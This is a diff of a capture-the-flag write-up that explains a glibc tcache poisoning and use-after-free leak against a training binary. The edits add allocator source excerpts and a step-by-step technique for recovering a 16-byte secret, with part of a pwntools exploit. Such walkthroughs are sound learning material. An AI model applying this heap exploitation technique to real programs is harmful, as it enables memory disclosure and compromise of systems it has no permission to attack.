@@ -4483,7 +4483,7 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 }
 ```
 
-This challenge is similar to [Seeking Substantial Secrets](#seeking-substantial-secrets-easy) — the secret is 16 bytes and we need to leak it to pass to `send_flag`. The twist is the guard check added after every `malloc`:
+The goal is to leak the 16-byte secret stored at `byte_429360` and pass it to `send_flag`. The interesting part of this binary is the guard check that fires after every `malloc`:
 
 ```c title="/challenge/seeking-smuggled-secrets-easy :: main() :: Pseudocode" showLineNumbers
 # ---- snip ----
@@ -4502,7 +4502,7 @@ else
 # ---- snip ----
 ```
 
-If the returned pointer falls below `secret_addr + 0x10000`, the program nullifies `ptr[idx]`. In the substantial-secrets exploit we relied on `ptr[1] = secret_addr` being a usable pointer to call `puts` on — but here that pointer gets wiped. We need another way out.
+If the returned pointer falls below `secret_addr + 0x10000`, the program nullifies `ptr[idx]`, so we never get a direct handle to the secret. The straightforward approach of pointing an allocation at `secret_addr` and calling `puts` on it is closed off.
 
 A correct implementation would have validated **before** calling `malloc`:
 
@@ -4522,13 +4522,28 @@ ptr[v7] = malloc(size);
 # ---- snip ----
 ```
 
-But this program checks the **result** of `malloc` after the fact. By then the tcache has already popped `secret_addr` and advanced its internal `entries[idx]` field. The guard closes the door but the horse has already bolted — and that side effect is exactly what we'll exploit.
+But this program checks the **result** of `malloc` after the fact. By then the tcache has already popped `secret_addr` and advanced its internal `entries[idx]` field. The guard closes the door, but the horse has already bolted, and that side effect is exactly what we will exploit.
 
 ### Leaking via Stale Tcache HEAD
 
-Recall from substantial-secrets that after popping `secret_addr`, the tcache's `entries[idx]` field gets overwritten with `*(secret_addr)` = `secret[:8]`. The `print_tcache` helper displays it as NULL because count is 0 — but the raw memory still holds the secret bytes as a stale value.
+The tcache's `entries[]` array and `counts[]` array are independent. When `malloc` pops the last chunk from a bin, glibc does this:
 
-In substantial-secrets we ignored this stale value because we had a direct pointer to the secret. Here, we have no such pointer — but we can force the stale value to leak by **freeing chunk A again**. When `free` adds chunk A to the empty bin, it writes the current `entries[idx]` value (the stale `secret[:8]`) into chunk A's `next` field. Then `puts(0)` reads from chunk A and prints those bytes.
+```c
+*entries = REVEAL_PTR(e->next);   // entries[idx] = whatever was in popped chunk's next
+--(tcache->counts[tc_idx]);        // count drops to 0
+```
+
+Nothing zeroes `entries[idx]` when the count reaches 0. If the popped chunk was `secret_addr`, then `entries[idx]` now holds `*(secret_addr)`, which is `secret[:8]`. The `print_tcache` helper iterates `count` times from `entries[idx]`, so when count is 0 the loop body never runs and the head displays as `(nil)`. The display layer hides it, but the raw memory still holds the secret bytes.
+
+The next time we `free` a chunk of the same size class, `tcache_put` runs:
+
+```c
+e->next = PROTECT_PTR(&e->next, tcache->entries[tc_idx]);
+tcache->entries[tc_idx] = e;
+++(tcache->counts[tc_idx]);
+```
+
+The new chunk's `next` is set to whatever is currently in `entries[idx]`, with no validation. The stale secret bytes get copied straight into the freed chunk's first 8 bytes, where `puts` can read them.
 
 **Step 1: Allocate two chunks and free them**
 
@@ -4623,9 +4638,9 @@ scanf(0, p64(secret_addr))
 └──────────────────────────────────┘
 ```
 
-**Step 3: `malloc` twice — second one gets discarded**
+**Step 3: `malloc` twice, second one gets discarded**
 
-The first `malloc` pops chunk A normally — it's a real heap address, the guard passes. The second `malloc` pops `secret_addr` and advances the tcache's `entries[idx]` field to `*(secret_addr)` = `secret[:8]`. Then the guard fires and nullifies `ptr[1]`. The pointer is gone, but the stale `secret[:8]` value is now sitting in the tcache.
+The first `malloc` pops chunk A normally. It is a real heap address, the guard passes. The second `malloc` pops `secret_addr` and advances the tcache's `entries[idx]` field to `*(secret_addr)`, which is `secret[:8]`. Then the guard fires and nullifies `ptr[1]`. The pointer is gone, but the stale `secret[:8]` value is now sitting in `entries[idx]`.
 
 ```c title="/challenge/seeking-smuggled-secrets-easy :: main() :: Pseudocode" showLineNumbers
 # ---- snip ----
@@ -4638,7 +4653,7 @@ if ( ptr[v7] >= (char *)&secret + 65536 )
 else
 {
   puts("Invalid allocation detected: discarded!");
-  ptr[v7] = 0LL;                     // too late — entries[idx] already advanced
+  ptr[v7] = 0LL;                     // too late, entries[idx] already advanced
 }
 
 # ---- snip ----
@@ -4661,9 +4676,11 @@ malloc(1) → ptr[1] = NULL (secret_addr discarded by guard)
 └┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
 ```
 
-**Step 4: Free chunk `A` - its next gets set to the stale entries value**
+The key insight is that `entries[128]` and `counts[128]` are independent. The display reads `counts[128] == 0` and renders the head as `(nil)`, but the underlying 8 bytes at `entries[128]` were never cleared. They still hold `secret[:8]`.
 
-When we `free(0)`, the allocator inserts chunk A at the front of the bin. The insertion sets chunk A's `next` to the **current value** at `entries[128]` — which is the stale `secret[:8]` from step 3.
+**Step 4: Free chunk `A`, its next gets set to the stale entries value**
+
+When we `free(0)`, `tcache_put` inserts chunk A at the front of the bin. The insertion sets chunk A's `next` to the **current value** at `entries[128]`, which is the stale `secret[:8]` from step 3. There is no check that this value is a valid pointer, it is just copied verbatim.
 
 ```
 free(0)
@@ -4692,7 +4709,7 @@ free(0)
 
 **Step 5: `puts` leaks the secret**
 
-`ptr[0]` still points to chunk A because `free` never clears the pointer. When we call `puts(0)`, the program reads from chunk A's memory. The very first bytes of chunk A are its `next` field — which now holds the secret bytes.
+`ptr[0]` still points to chunk A because `free` never clears the pointer. When we call `puts(0)`, the program reads from chunk A's memory. The very first bytes of chunk A are its `next` field, which now holds the secret bytes.
 
 ```c title="/challenge/seeking-smuggled-secrets-easy :: main() :: Pseudocode" showLineNumbers
 # ---- snip ----
@@ -4703,7 +4720,7 @@ puts((const char *)ptr[v9]);   // ptr[0] = &A, reads from A's next field = "lbaa
 # ---- snip ----
 ```
 
-Since the secret is 16 bytes and each round only leaks 8, we run the whole trick twice — once targeting `secret_addr` and once targeting `secret_addr + 8`.
+Since the secret is 16 bytes and each round only leaks 8, we run the whole trick twice, once targeting `secret_addr` and once targeting `secret_addr + 8`.
 
 ### Exploit
 
@@ -4746,7 +4763,7 @@ def leak_8_bytes(target):
     free(0)
     scanf(0, p64(target))
     malloc(0, 128)
-    malloc(1, 128)  # discarded — entries[128] = secret bytes at target
+    malloc(1, 128)  # discarded, entries[128] = secret bytes at target
     free(0)         # chunk 0's next = stale entries = secret bytes
     return puts(0).ljust(8, b"\x00")[:8]
 
